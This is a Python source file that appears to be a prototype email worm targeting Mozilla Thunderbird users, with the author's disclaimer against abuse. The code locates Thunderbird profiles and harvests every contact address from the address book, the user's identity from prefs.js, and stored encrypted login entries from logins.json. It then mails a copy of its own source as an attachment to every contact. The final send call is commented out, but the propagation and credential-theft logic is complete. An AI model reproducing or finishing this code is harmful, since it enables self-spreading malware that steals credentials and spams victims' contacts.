#!/usr/bin/python

"""
(c) 2022 telekobold <mail@telekobold.de>

This program was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. Please
do not abuse it to cause any harm!
"""

# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

import os
import platform
import shutil
import sys
import re
import sqlite3
import typing

import smtplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE # Value: ", "
import json

import filewriter


# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

INSTALLED_OS: str = platform.system()
LINUX: str = "Linux"
WINDOWS: str = "Windows"

SSL: str = "SSL"
TLS: str = "TLS"
STARTTLS: str = "STARTTLS"

# type variables:
ArbitraryType = typing.TypeVar("ArbitraryType")
ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
IntKeyArbValDict = typing.Dict[int, ArbitraryType]
IntKeyStrValDict = typing.Dict[int, str]

TESTING_DIR = "/home/telekobold/TestVerzeichnis/thunderbird-Kopie"


# --------------------------------------------------------------------------
# ----------------- 3rd class send email helper functions ------------------
# --------------------------------------------------------------------------

def flat_search_dict(searched_key: ArbitraryType, input_dict: ArbKeyArbValDict) -> ArbitraryType:
    """
    Searches the top level of a dictionary for the passed `searched_key`
    and returns its corresponding value.
    
    :return: the value to the passed `searched_key` if this `searched_key`
             could be found.
    """
    if not isinstance(input_dict, dict):
        print("The passed `input_dict` must be a Python dictionary!")
    else:
        for k, v in input_dict.items():
            if k == searched_key:
                return v


# --------------------------------------------------------------------------
# ----------------- 2nd class send email helper functions ------------------
# --------------------------------------------------------------------------

def determine_thunderbird_default_file_path() -> str:
    """
    Determines Thunderbird's config directory file path on the current system.
    
    :returns: the absolute file path to Thunderbird's config directory
              or "" if no such file path could be found or if the detected 
              operating system is neither Windows, nor Linux.
    """
    USER_FILE_PATH: str = os.path.expanduser("~")
    THUNDERBIRD_PATH_WINDOWS: str = os.path.join(USER_FILE_PATH, "AppData", "Roaming", "Thunderbird")
    THUNDERBIRD_PATH_LINUX_1: str = os.path.join(USER_FILE_PATH, ".thunderbird")
    THUNDERBIRD_PATH_LINUX_2: str = os.path.join(USER_FILE_PATH, "snap", "thunderbird", "common", ".thunderbird")
    # for testing purposes:
    #thunderbird_path_linux: str = os.path.join(USER_FILE_PATH, "TestVerzeichnis", "filewriter_test")
    thunderbird_path: str = ""
    
    if INSTALLED_OS == WINDOWS:
        if os.path.isdir(THUNDERBIRD_PATH_WINDOWS):
            thunderbird_path = THUNDERBIRD_PATH_WINDOWS
    elif INSTALLED_OS == LINUX:
        if os.path.isdir(THUNDERBIRD_PATH_LINUX_1):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_1
        elif os.path.isdir(THUNDERBIRD_PATH_LINUX_2):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_2
            
    return thunderbird_path


def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names: typing.List[str]) -> typing.List[str]:
    """
    Helper function for `find_thunderbird_profile_dirs()`.
    
    :thunderbird_path:  The absolute file path to the Thunderbird default
                        config directory.
    :line:              A line of a browsed text file (installs.ini or 
                        profiles.ini).
    :profile_dir_names: A list to add absolute file names to detected
                        Thunderbird profile directories.
    :returns:           `profile_dir_names` with another profile dir extracted
                        from `line` if this profile dir exists on the system
                        and was not already contained in `profile_dir_names`.
    """
    line = line.strip()
    relative_profile_dir_path: str = line.split("=", maxsplit=1)[1]
    # Thunderbird uses the / especially on Windows systems,
    # so it would be wrong to use `os.path.sep`:
    l: typing.List[str] = relative_profile_dir_path.split("/")
    profile_dir_path_part: str = None
    profile_dir_name: str = None
    
    # Append potential subdirectories to the `thunderbird_path`.
    # Usually, the default profile dir should be in a "Profiles" 
    # directory on Windows systems and directly in the current
    # directory on Linux systems.
    relative_profile_dir_path = ""
    for i in range(len(l)-1):
        relative_profile_dir_path = l[i] if relative_profile_dir_path == "" else os.path.join(relative_profile_dir_path, l[i])
    #print(f"relative_profile_dir_path = {relative_profile_dir_path}") # test output
    profile_dir_name = l[len(l)-1]
    profile_dir_name_absolute = os.path.join(thunderbird_path, relative_profile_dir_path, profile_dir_name)
    if os.path.isdir(profile_dir_name_absolute) and profile_dir_name_absolute not in profile_dir_names:
        profile_dir_names.append(profile_dir_name_absolute)
        
    return profile_dir_names


# TODO: Probably delete this function:
def search_file_in_default_dir(filename: str) -> str:
    """
    Searches for a file in the user's default Thunderbird profile directory.
    
    :filename: the relative file name of the file to be searched.
    :returns:  the absolute file name to the searched file if the file could be 
               found, `None` otherwise.
    """
    if not THUNDERBIRD_PROFILE_DIR:
        find_thunderbird_profile_dirs()
    if not THUNDERBIRD_PROFILE_DIR:
        print(f"The file {filename} could not be found!")
        return None
    absolute_filepath = os.path.join(THUNDERBIRD_PROFILE_DIR, filename)
    if os.path.isfile(absolute_filepath):
        return absolute_filepath
    return None


def gen_dict_extract_special(searched_key_1: ArbitraryType, searched_value_1: ArbitraryType, searched_key_2: ArbitraryType, searched_key_3: ArbitraryType, searched_elem: ArbKeyArbValDict) -> typing.Tuple[ArbitraryType, ArbitraryType]:
    """
    If `searched_key_1` was found and has the passed `searched_value_1` or ends 
    with the passed `searched_value_1`, search the same dictionary layer for 
    `searched_key_2` and `searched_key_3` and return their values.
    
    :returns: the values belonging to `searched_key_2` and `search_key_3`
              if the conditions described above are met.
    """
    if not isinstance(searched_elem, dict):
        print("The passed `searched_elem` must be a Python dictionary!")
        return None
    else:
        for k, v in searched_elem.items():
            if k == searched_key_1 and v.endswith(searched_value_1):
                v_2 = flat_search_dict(searched_key_2, searched_elem)
                v_3 = flat_search_dict(searched_key_3, searched_elem)
                print(f"I v_2 = {v_2}, v_3 = {v_3}")
                return v_2, v_3
            if isinstance(v, dict):
                for result in gen_dict_extract_special(searched_key_1, searched_value_1, searched_key_2, searched_key_3, v):
                    print(f"II type(result) = {type(result)}")
                    print(f"II result = {result}")
                    return result
            elif isinstance(v, list):
                for d in v:
                    for result in gen_dict_extract_special(searched_key_1, searched_value_1, searched_key_2, searched_key_3, d):
                        print(f"III type(result) = {type(result)}")
                        print(f"III result = {result}")
                        return result


def send_mail_ssl(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
    """
    Sends an email using SSL.
    
    # TODO: document missing parameters
    :returns: 0 in case of success, 1 in case of error
    """
    
    # TODO: Ggf. Ports nochmal überarbeiten oder sogar spezifisch einzelnen Anbietern zuordnen
    port = 465

    with smtplib.SMTP_SSL(smtp_server_url, port) as smtp_server:
        # smtp_server.ehlo()
        try:
            l = smtp_server.login(sender_email, password)
            print("l = {}\n".format(l)) # test output
        except Exception as l_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to login!", l_ex) # test output
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to send mail!", s_ex) # test output
            return 1

    
    print ("Email sent successfully!") # test output
    return 0


def send_mail_starttls(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
    """
    Sends an email using STARTTLS.
    """
    
    # TODO: If necessary, revise ports again or even assign them specifically to 
    # individual email providers.
    starttls_smtp_port = 587

    with smtplib.SMTP(smtp_server_url, starttls_smtp_port) as smtp_server:
        # smtp_server.ehlo()
        try:
            smtp_server.starttls()
            # smtp_server.ehlo()
        except Exception as e:
            print("Exception thrown when trying to create starttls connection!", e) # test output
            return 1
        try:
            l = smtp_server.login(sender_email, password)
            print("l = {}\n".format(l)) # test output
        except Exception as l_ex:
            print("Exception thrown when trying to login!", l_ex) # test output
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            print("Exception thrown when trying to send mail!", s_ex) # test output
            return 1
        
    print ("Email sent successfully!") # test output
    return 0


# Copied from filewriter.py
def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
    """
    Reads the passed text file line by line to a Python dictionary.
    
    :filename: the absolute file name of a text file.
    :returns:  a Python dictionary whose keys are the line numbers (integer 
               values) and the appropriate values being the content of this line 
               (string values) in the text file belonging to the passed
               `filename`.
    """
    result = {}
    # TODO: Add error handling if file opening doesn't work (e.g. because of 
    # missing access rights). In this case, just continue to the next file.
    with open(filename, "r") as file:
        lines = file.readlines()
    
    # NOTE: The line indexing starts with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line
        
    # print("read_text_file_to_dict: result = {}".format(result)) # test output
    return result


# --------------------------------------------------------------------------
# ----------------- 1st class send email helper functions ------------------
# --------------------------------------------------------------------------

def determine_possible_paths() -> str:
    """
    Determines possible paths where an executable of Mozilla Thunderbird
    could be located and returns them as possibly extended PATH variable
    in the appropriate syntax, depending on which operating system is installed.
    
    :returns: A possibly extended version of the local PATH variable
              or `None` if no PATH variable could be found or if the detected OS
              is neither "Windows", nor "Linux".
    """
    try:
        paths: str = os.environ["PATH"]
    except KeyError:
        return None
    additional_paths_windows: typing.List[str] = [os.path.join("C:\Program Files", "Mozilla Thunderbird")]
    additional_paths_linux: typing.List[str] = []
    additional_paths: typing.List[str] = []
    splitter: str = ""
    
    if INSTALLED_OS == WINDOWS:
        splitter = ";"
        additional_paths = additional_paths_windows
    elif INSTALLED_OS == LINUX:
        splitter = ":"
        additional_paths = additional_paths_linux
    else:
        # Not supported OS
        return None
    read_paths_list = paths.split(splitter)
    for path in additional_paths:
        if path not in read_paths_list:
            paths = paths + splitter + path
    
    return paths


def find_thunderbird_profile_dirs() -> typing.List[str]:
    """
    Searches the files "installs.ini" and "profiles.ini" for listed profile
    directories and returns them if those directories exist.
    
    If a file "installs.ini" exists, all profile directories referenced in this
    file are returned if those directories exist.
    Otherwise, the default profile directory in "profiles.ini" is returned.
    
    :returns: a list of detected profile directories or `None` if no directory
              could be found or if the installed operating system is neither
              Windows, nor Linux.
    """
    #thunderbird_path: str = determine_thunderbird_default_file_path()
    thunderbird_path: str = TESTING_DIR
    
    installs_ini: str = os.path.join(thunderbird_path, "installs.ini")
    profiles_ini: str = os.path.join(thunderbird_path, "profiles.ini")
    profile_dir_names: typing.List[str] = []
    
    # If there is an installs.ini file, return the file paths of all
    # profile directories referenced in that file if those profile directories 
    # actually exist. Avoid redundant entries.
    if os.path.isfile(installs_ini):
        #print("Use installs.ini file")
        with open(installs_ini, "r") as iif:
            for line in iif:
                if line.startswith("Default="):
                    #print("Default line found!") # test output
                    profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
            #print(f"profile_dir_names = {profile_dir_names}")
            return profile_dir_names
    
    # If there is no installs.ini file, return the file path of the
    # default profile file from the profiles.ini file (the profile file which
    # has a flat "Default=1"):
    # Falls die aktuelle Zeile.strip() aus "Default=1" besteht und eine mit "Path=" anfangende Zeile entweder vor oder nach der aktuellen Zeile steht, ohne dass eine Zeile dazwischen war, die nur aus Whitespaces besteht, entspricht das "Path=" einem Pfad, welcher zu profile_dir_names hinzugefügt werden muss.
    # This algorithm assumes that the profiles.ini file is correctly formatted.
    profile_introduction_string_regex = re.compile("\[[0-9a-zA-Z]*\]")
    in_profile_def: bool = False
    path_detected: bool = False
    path_content: str = ""
    default_detected: bool = False
    if os.path.isfile(profiles_ini):
        print("Use profiles.ini file")
        with open(profiles_ini, "r") as pif:
            for line in pif:
                line = line.strip()
                if line == "":
                    in_profile_def = False
                    path_detected = False
                    default_detected = False
                    path_content = ""
                elif profile_introduction_string_regex.match(line):
                    in_profile_def = True
                elif line.startswith("Path="):
                    path_detected = True
                    path_content = line
                    if in_profile_def and default_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
                elif line == "Default=1":
                    default_detected = True
                    if in_profile_def and path_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, path_content, profile_dir_names)
    
    print(f"profile_dir_names = {profile_dir_names}")
    return profile_dir_names


def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
    """
    :filepath: the file path to the database (usually the file path to the
               Thunderbird profile directory).
    :returns:  a list of all email addresses as string values contained in 
               Thunderbird's "abook.sqlite" database if this database exists, 
               `None` otherwise.
    """
    database = os.path.join(filepath, "abook.sqlite")
    #print(f"database = {database}")
    con = None
    email_addresses = []
    
    if os.path.isfile(database):
        with sqlite3.connect(database) as con:
            with con:
                cur = con.cursor()
                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
                rows = cur.fetchall()
                for row in rows:
                    (email_addr,) = row # unpack the tuple returned by fetchall()
                    email_addresses.append(email_addr)
            return email_addresses
    else:
        return None
    
    
def read_sender_name_and_email_thunderbird(profile_dir: str) -> typing.Tuple[str, str]:
    """
    Searches for the full name and email address in the user's Thunderbird
    default profile. This is usually the full name and email address the user
    first typed in when setting up Thunderbird.
    
    :profile_dir: the file path to the Thunderbird profile directory.
    :returns:     A tuple containing the user's full name and email address.
                  These values can each be `None` if no corresponding value 
                  could be found.
    """
    # The user's full name is stored in the variable "mail.identity.id1.fullName", 
    # the user's email address in the variable "mail.identity.id1.useremail" in 
    # the file "prefs.js" in the user's Thunderbird profile.
    
    user_name = None
    user_email = None
    prefs_js_filename = os.path.join(profile_dir, "prefs.js")
    
    if prefs_js_filename: # if prefs_js_filename is not `None`
        lines = filewriter.read_text_file_to_dict(prefs_js_filename)
        user_name_regex = r", \"(.+?)\"\);"
        # Regex matching all possible email addresses:
        # email_regex = TODO
        # Email regex including a leading '"' and a trailing '");':
        # email_regex_incl = "\"" + email_regex + "\");"
        email_regex_incl = user_name_regex
        # Search the file "prefs.js" for the user's name:
        for i in lines:
            if "mail.identity.id1.fullName" in lines[i]:
                # A string.endsWith(substring) check would be better, 
                # but a regular expression should be checked here 
                # instead of a fixed substring...
                user_name_match = re.search(user_name_regex, lines[i])
                if user_name_match:
                    user_name_raw = user_name_match.group()
                    # Remove the leading '"' and the trailing '");' 
                    # to obtain the user name:
                    user_name = user_name_raw[3:len(user_name_raw)-3:1]
                    break # Break the loop since the searched user name was found.
        # Search the file "prefs.js" for the users' email address:
        for i in lines:
            if "mail.identity.id1.useremail" in lines[i]:
                user_email_match = re.search(email_regex_incl, lines[i])
                if user_email_match:
                    user_email_raw = user_email_match.group()
                    user_email = user_email_raw[3:len(user_email_raw)-3:1]
                    break # Break the loop since the search user email address 
                          # was found.
                
    return (user_name, user_email)


def read_sender_username_and_password_thunderbird(host_name: str, profile_dir: str) -> typing.Tuple[str, str]:
    """
    Searches the file "logins.json" in the user's Thunderbird default profile 
    directory for "httpRealm" keys containing a value that ends with the past 
    host name. Returns the values of the associated "encryptedUsername" and 
    "encryptedPasswords" keys as tuple.
    
    TODO: Check if those passwords can be encrypted if the user types its
    master password.
    
    :host_name:   the host name
    :profile_dir: the file path to the Thunderbird profile directory.
    :returns:     a tuple containing the described values.
    """
    logins_json_filepath = os.path.join(profile_dir, "logins.json")
    print(f"logins_json_filepath = {logins_json_filepath}")
    with open(logins_json_filepath) as ljf:
        ljf_data = json.load(ljf)
    # return (encrypted_username, encrypted_password):
    return gen_dict_extract_special("httpRealm", host_name, "encryptedUsername", "encryptedPassword", ljf_data)


def determine_smtp_server(email_address: str) -> typing.Tuple[str]:
    """
    :email_address: the email address for which the SMTP server data should be 
                    found.
    :return:        a tuple containing the URL of the SMTP server and the  
                    authentication method to the specified `email_address`.
    """
    smtp_servers = {"gmx.net" : ("mail.gmx.net", SSL), "web.de" : ("smtp.web.de", SSL), "gmail.com" : ("smtp.gmail.com", SSL)}
    aliases = {"gmx.de" : "gmx.net", "gmx.ch" : "gmx.net", "gmx.at" : "gmx.net"}
    
    for s in smtp_servers:
        if email_address.endswith(s):
            return smtp_servers[s]
        
    for a in aliases:
        if email_address.endswith(a):
            return smtp_servers[aliases[a]]


def send_mail_mime(smtp_server_url: str, encryption_method: str, password: str, to: typing.List[str]) -> None:
    """
    Sends a plaintext email containing this script as attachment.
    
    :smtp_server_url:   the URL of the SMTP server
    :encryption_method: the encryption method to use. Can bei either "SSL" 
                        ("TLS") or "STARTTLS".
    :password:          the password that is used for the authentication on the 
                        SMTP server
    :to:                a list containing all recipient addresses
    """
    # TODO: Include functionality to also send the sender's name
    
    # TODO: Realize with enum or constants:
    if encryption_method != SSL and encryption_method != STARTTLS:
        print("No valid encryption_method was specified!")
        return
    
    # TODO: Adapt values:
    subject = "Test"
    body = "This is a test mail"
    msg = MIMEMultipart() # Contains the whole email
    
    # Build (parts of) the header and the text/plain body:
    msg["From"] = sender_email
    msg["To"] = COMMASPACE.join(to)
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg["Subject"] = subject
    # msg["Bcc"]
    msg.attach(MIMEText(body, "plain")) # Add the body to the message
    
    # Build a base64-encoded body consisting of a text/x-python attachment 
    # containing the content of this python script:
    with open(os.path.realpath(__file__), "r") as attachment_file:
        attachment_part = MIMEText(attachment_file.read(), "x-python", _charset="utf-8")
    email.encoders.encode_base64(attachment_part)
    attachment_part.add_header("Content-Disposition", "attachment", filename=os.path.basename(__file__))
    # Add the attachment to the message:
    msg.attach(attachment_part)
    
    whole_email_text = msg.as_string() # Convert the whole email to a single string
    
    if encryption_method == SSL:
        send_mail_ssl(smtp_server_url, sender_email, password, to, whole_email_text)
    elif encryption_method == STARTTLS:
      send_mail_starttls(smtp_server_url, sender_email, password, to, whole_email_text)


# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

def send_email() -> None:
    """
    Sends this program to all email addresses in the address book of the
    installed Thunderbird client.
    """
    thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
    #print(f"thunderbird_install_path = {thunderbird_install_path}") # test output
    if not thunderbird_install_path:
        print("Mozilla Thunderbird is not installed on the system!")
        sys.exit(0)
    else:
        # Detect all Thunderbird profile directories:
        profile_dirs = find_thunderbird_profile_dirs()
        for profile_dir in profile_dirs:
            #print(f"profile_dir = {profile_dir}")
            to_email_addresses: typing.List[str] = read_email_addresses_thunderbird(profile_dir)
            print(f"to_email_addresses = {to_email_addresses}") # test output
            sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
            print(f"sender_name = {sender_name}")
            print(f"sender_email = {sender_email}")
            host_name = sender_email.split("@")[1]
            print(f"host_name = {host_name}")
            print(f"output: {read_sender_username_and_password_thunderbird(host_name, profile_dir)}")
            #sender_username, sender_password = read_sender_username_and_password_thunderbird(host_name, profile_dir)
            #print(f"sender_username = {sender_username}")
            #print(f"sender_password = {sender_password}")
            """
            smtp_server_url, authentication_method = determine_smtp_server(sender_email)
            send_mail_mime(smtp_server_url, authentication_method, sender_password, to_email_addresses)
            """


if __name__ == "__main__":
    send_email()
